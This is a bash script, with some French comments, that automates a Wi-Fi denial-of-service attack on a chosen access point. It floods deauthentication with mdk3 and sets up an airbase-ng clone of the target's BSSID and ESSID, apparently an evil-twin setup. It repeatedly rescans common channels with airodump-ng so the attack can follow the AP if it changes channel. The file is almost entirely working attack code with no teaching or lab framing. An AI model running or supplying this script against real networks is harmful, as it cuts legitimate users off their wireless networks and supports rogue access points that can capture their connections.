#!/bin/bash
echo $$ >/tmp/terminal.pid


################################################################

f_floodinterface(){    # fonction qui demande les infos a l'utilisateur
ifconfig -a
unset int
while [ -z "${int}" ]; do read -p "Name of your second wireless card use to DoS target AP(enter wlan5 if you use hostapd multi AP): " int; done
       if echo ${int} | egrep '^wlan*|wlp*|wlx*'  ; then
echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
airmon-ng start ${int}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_floodinterface
fi

ifconfig -a
unset intmoniteur
while [ -z "${intmoniteur}" ]; do read -p "Name of the second wireless card in monitor mode: " intmoniteur; done
        echo -e "\e[1;34m[*]\e[0m OK"

unset ESSID
while [ -z "${ESSID}" ]; do read -p "Essid real AP: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"

unset canal
while [ -z "$canal" ]; do read -p "Channel of real AP: " canal; done
if (($canal >= 1 && $canal <= 13)); then
echo -e "\e[1;34m[*]\e[0m OK."
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 4;
f_floodinterface
fi


unset seconde
while [ -z "$seconde" ]; do read -p "Time before check AP channel (MUST BE MORE LONGER THAN 90): " seconde; done
if (($seconde >= 90 && $seconde <= 259200)); then
echo -e "\e[1;34m[*]\e[0m OK."
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid time !\n"
	sleep 4;
f_floodinterface
fi


read -ep "                BSSID of target network : " BSSID           
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : BSSID no valid $colorbase"
echo "  "
read -ep "                BSSID of target network : " BSSID 
echo "  "            
done
f_floodinstantane   # une fois les infos demandés on passe a la boucle 1 qui est la fonction floodinstantane (voir plus bas)
}

#####################################################

f_checkap(){              
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c $canal --essid ${ESSID} -w track ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel has not moved yet, restarting DoS..."
sleep 1;
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airbase.pid`
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP has moved his channel... searching it...\e[0m"
sleep 1;
rm -rf track*
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airbase.pid`
kill `cat /tmp/airodump.pid`
sleep 5;
fi

canal=1
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track1 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track1-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 1, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel 1... searching it again...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=11
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track11 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track11-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 11, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel 11... searching it again...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=6
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track6 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 5;
if grep -q "${BSSID}" "track6-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 6, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel 6... channel 1 11 and 6 have been tested without success !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=13
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track13 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track13-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 13, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel 13... searching it again...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=3
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track3 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track3-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 3, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel 3... searching it again...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi

canal=9
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track9 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "track9-01.kismet.csv" ; then 
   echo -e "\t\e[1;32m [+] AP channel find on channel 9, starting DoS it again"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
f_floodinstantane
else
    echo -e "\e[1;31m [!] AP is not on channel  1 3 6 9 11 and 13... --NO SUCESS-- take manual control to find it!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf track*
fi
}


#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Starting active DoS... AP channel will be check every number of second you entered"
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t ${BSSID} -c ${canal} &> /dev/null &
echo $! >/tmp/mdk3.pid
sleep 20;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -c 9 -a ${BSSID} --essid ${ESSID} -W 1 ${intmoniteur} &> /dev/null &
echo $! >/tmp/airbase.pid
sleep 4;
while : ; do
sleep ${seconde} ; f_checkap ; done
}



#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Sorry but this script need admin session" 1>&2
	exit 1
else
	clean=1
	f_floodinterface
fi





















